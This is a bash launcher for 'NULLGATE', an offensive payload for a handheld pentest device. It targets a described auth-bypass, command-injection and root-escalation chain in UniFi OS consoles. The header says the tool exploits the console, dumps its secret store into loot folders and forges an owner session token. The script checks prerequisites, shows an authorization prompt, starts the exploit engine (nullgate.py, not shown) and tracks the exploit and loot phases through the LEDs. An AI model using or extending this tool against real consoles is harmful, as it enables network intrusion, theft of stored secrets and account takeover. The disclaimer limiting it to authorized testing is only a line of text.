#!/bin/bash
# Title: NULLGATE - UniFi OS Unauthenticated Root RCE
# Author: sinXne0
# Description: Pager port of the UniFi OS auth-bypass -> command-injection -> root chain (CVE-2026-34908/34909/34910). Joins the LAN, discovers a console on TCP 11443, runs a non-destructive safety probe, then (on confirmation) exploits, dumps the secret store and forges an owner session token. All status is backed by real HTTP responses or callbacks -- no fake success states.
# Version: 1.0.0
# Category: user/exfiltration
# Firmware: 2.0.0-stable or newer
# Requires: python3-light (stdlib ssl/http.client/socket only)
# Optional: none. No HackRF, no monitor radio, no cross-compilation.
#
# AUTHORIZED TESTING ONLY. Exploit only consoles you own or have explicit
# written permission to test. This performs real unauthenticated RCE.
#
# HARD CONSTRAINTS (verified against Ubiquiti SAB-064 and public PoCs):
#   - Target: UniFi OS Server <= 5.0.6, or UniFi OS hardware <= 5.1.11,
#     with the setup wizard completed. Patched builds return HTTP 400.
#   - Requires L3 reachability to the console web UI on TCP 11443. The Pager
#     must be on the LAN (wlan0cli joined to the target WiFi, or wired via USB-C).
#   - RCE first runs as `ucs-update`; root needs passwordless sudo chmod/dpkg.
#     Some loot requires that second step. No target here => no live validation.
#   - The injection endpoint is blind (HTTP 200 != execution). A stage is only
#     marked CONFIRMED when the target calls back to the Pager with a nonce.
#   - self-signed TLS; certificate verification is disabled by design.
#   - WPA3/PMF, VLAN isolation or a patched console all block this payload.
#
# LED States
#   Cyan     engine starting / idle
#   Amber    probing or exploiting
#   Green    stage confirmed by callback
#   Red      error / patched / not vulnerable
#   Off      stopped
#
# Loot
#   /root/loot/nullgate/exploit.jsonl   one record per injection attempt
#   /root/loot/nullgate/reads.jsonl     file-read results
#   /root/loot/nullgate/dump_*/         decoded secret-store tarballs
#   /root/loot/nullgate/nullgate.log    engine/UI log

# === PAYLOAD SDK STUBS ===
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" 2>/dev/null && pwd)"
if ! command -v LOG          >/dev/null 2>&1; then LOG()          { echo "$*"; }; fi
if ! command -v LED          >/dev/null 2>&1; then LED()          { :; }; fi
if ! command -v ERROR_DIALOG >/dev/null 2>&1; then ERROR_DIALOG() { echo "ERROR: $*"; }; fi
if ! command -v CONFIRMATION_DIALOG >/dev/null 2>&1; then CONFIRMATION_DIALOG() { echo "${NULLGATE_CONFIRM:-true}"; }; fi

# === SELF-LOCATE ===
PAYLOAD_DIR=""
for candidate in "$SCRIPT_DIR" \
                 "${NULLGATE_PAYLOAD_DIR:-}" \
                 /root/payloads/user/*/nullgate \
                 /mmc/root/payloads/user/*/nullgate; do
    [ -n "$candidate" ] || continue
    if [ -f "$candidate/nullgate.py" ]; then
        PAYLOAD_DIR="$candidate"
        break
    fi
done

if [ -z "$PAYLOAD_DIR" ]; then
    LED RED 2>/dev/null
    LOG "red" "nullgate.py not found next to payload.sh"
    ERROR_DIALOG "NULLGATE files missing.\nRedeploy the payload folder."
    exit 1
fi

export PYTHONPATH="$PAYLOAD_DIR:$PAYLOAD_DIR/lib:${PYTHONPATH}"

STATE="${NULLGATE_STATE:-/tmp/nullgate_state.json}"
CMD="${NULLGATE_CMD:-/tmp/nullgate_cmd.jsonl}"
LOOT="${NULLGATE_LOOT:-/root/loot/nullgate}"
export STATE CMD LOOT

LOG_FILE="$LOOT/nullgate.log"
mkdir -p "$LOOT" /tmp
: > "$CMD"
rm -f "$STATE"

log(){ printf '%s %s\n' "$(date -u +%FT%TZ)" "$*" >> "$LOG_FILE" 2>/dev/null || true; }
die(){ FAIL "$*" 2>/dev/null || LOG "red" "$*"; log "FAIL $*"; LED R 255 0 0; exit 1; }
FAIL(){ LOG "red" "$*"; }
INFO(){ LOG "cyan" "$*"; }
SUCCESS(){ LOG "green" "$*"; }

PYTHON="$(command -v python3 || true)"
[ -n "$PYTHON" ] || die "python3 not installed"
"$PYTHON" -c 'import sys; sys.exit(0 if sys.version_info >= (3,6) else 1)' 2>/dev/null || die "python3 >= 3.6 required"

# Capability gate: if stdlib SSL is missing, fail loudly instead of faking it.
"$PYTHON" "$PAYLOAD_DIR/nullgate.py" capcheck >>"$LOG_FILE" 2>&1 || die "capability check failed; see $LOG_FILE"

# Authorization gate -- explicit acceptance before any network traffic.
CONFIRM="$(CONFIRMATION_DIALOG "NULLGATE performs REAL unauthenticated RCE against UniFi OS consoles.\n\nAuthorized testing ONLY. Only use on consoles you own or have written permission to test.\n\nContinue?" 2>/dev/null || true)"
case "$CONFIRM" in
  true|TRUE|yes|YES|A|a) ;;
  *) INFO "Authorization declined. Exiting."; exit 0 ;;
esac

INFO "NULLGATE starting (callback port=${NULLGATE_CB_PORT:-8844})"
log "start dir=$PAYLOAD_DIR"

# Stop the stock UI so both processes do not fight over the framebuffer.
if command -v pineapplepager >/dev/null 2>&1; then
  /etc/init.d/pineapplepager stop >/dev/null 2>&1 || true
  killall pineapplepager >/dev/null 2>&1 || true
fi

cleanup(){
  trap - INT TERM EXIT
  INFO "stopping NULLGATE"
  log "stop"
  [ -n "$ENGINE_PID" ] && kill "$ENGINE_PID" >/dev/null 2>&1 || true
  [ -n "$UI_PID" ] && kill "$UI_PID" >/dev/null 2>&1 || true
  wait "$ENGINE_PID" >/dev/null 2>&1 || true
  wait "$UI_PID" >/dev/null 2>&1 || true
  rm -f "$STATE" "$CMD"
  LED ALL OFF
  exit 0
}
trap cleanup INT TERM EXIT

ENGINE_PID=""
UI_PID=""
LED C 0 180 255

"$PYTHON" "$PAYLOAD_DIR/nullgate.py" engine >>"$LOG_FILE" 2>&1 &
ENGINE_PID=$!
sleep 0.4
kill -0 "$ENGINE_PID" 2>/dev/null || die "engine failed; see $LOG_FILE"

"$PYTHON" "$PAYLOAD_DIR/sd/ui.py" >>"$LOG_FILE" 2>&1 &
UI_PID=$!
sleep 0.4
kill -0 "$UI_PID" 2>/dev/null || die "UI failed; see $LOG_FILE"

SUCCESS "NULLGATE running. Authorize in the UI, discover a console, probe, then own it."
LED C 0 180 255

while true; do
  if ! kill -0 "$ENGINE_PID" 2>/dev/null; then
    die "engine exited unexpectedly; see $LOG_FILE"
  fi
  if ! kill -0 "$UI_PID" 2>/dev/null; then
    log "UI exited; stopping engine"
    break
  fi
  if [ -f "$STATE" ]; then
    if grep -q '"phase":"off"' "$STATE" 2>/dev/null; then
      break
    fi
    if grep -q '"exploit":{"loot":"confirmed"' "$STATE" 2>/dev/null; then
      LED 0 235 130 2>/dev/null || true
    elif grep -q '"phase":"exploit"' "$STATE" 2>/dev/null || \
         grep -q '"phase":"loot"' "$STATE" 2>/dev/null || \
         grep -q '"phase":"proof"' "$STATE" 2>/dev/null; then
      LED 255 176 32 2>/dev/null || true
    fi
  fi
  sleep 0.5
done

cleanup
